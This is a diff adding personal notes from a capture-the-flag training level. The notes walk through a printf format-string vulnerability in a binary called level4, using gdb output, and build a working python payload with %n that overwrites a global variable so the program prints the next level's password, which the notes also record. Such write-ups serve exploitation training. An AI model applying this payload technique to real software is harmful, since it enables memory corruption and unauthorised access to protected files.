@@ -1,0 +1,88 @@
+login : pw
+	level4 : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+disas main
+	=> call n()
+
+disas n
+	=> stack allocated = 0x218
+	=> esp + 0x8 => x 0x8049804 => stdin
+	=> esp + 0x4 => 0x200 => 512
+	=> esp => ebp - 0x208 => 520 (buffer size)
+	fgets called
+		=> fgets is not vulnerable
+	p called with buf
+	cmp ds:0x8049810 with 0x1025544
+		=> x 0x8049810
+			=> m
+				=> again global variable
+		if equal
+			=> system call with 0x8048590
+				x/s 0x8048590
+					=> "/bin/cat /home/user/level5/.pass"
+
+disas p
+	=> printf with buf only
+
+Looks similar to level3 but:
+	=> buffer can only be 512 long and we need 0x1025544 in m
+		=> p/d 0x1025544 = 16930116
+			=> Cant count on character number with n as level4
+		=> https://axcheron.github.io/exploit-101-format-strings/
+
+p &m
+	=> (<data variable, no debug info> *) 0x8049810
+		=> 0x08049810
+
+b *p+12
+	=> before printf
+
+r
+	=> ab  %p  %p  %p  %p
+
+x/32xw $esp
+	=> 0xbffff3f0:	0xbffff420	0xb7ff26b0	0xbffff664	0xb7fd0ff4
+	=> 0xbffff400:	0x00000000	0x00000000	0xbffff628	0x0804848d
+	=> 0xbffff410:	0xbffff420	0x00000200	0xb7fd1ac0	0xb7ff37d0
+	=> 0xbffff420:	0x20206261	0x20207025	0x20207025	0x20207025
+		=> 4th line is our string
+
+continue
+	=> ab  0xb7ff26b0  0xbffff664  0xb7fd0ff4  (nil)
+		=> x in x$ should be 3 + 4 + 4 + 1 = 12
+
+b *p+17
+	=> after printf
+
+python -c 'print "\x10\x98\x04\x08" + "%12$n"' > /tmp/b
+
+r < /tmp/b
+	=> �
+
+p m
+	=> 4
+		=> address of m is 4 bytes, so 4 is stored in m
+
+We have 4 bytes first
+	=> We want 16930116 as value in m
+		=> Lets use a width modifier with 16930116-4 = 16930112
+
+python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' > /tmp/b
+
+r < /tmp/b
+	=> p m
+		=> 16930116
+
+continue
+	=> /bin/cat: /home/user/level5/.pass: Permission denied
+		=> We are in gdb
+
+Lets try outside:
+
+./level4 < /tmp/b
+	=> 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+
+
+
+
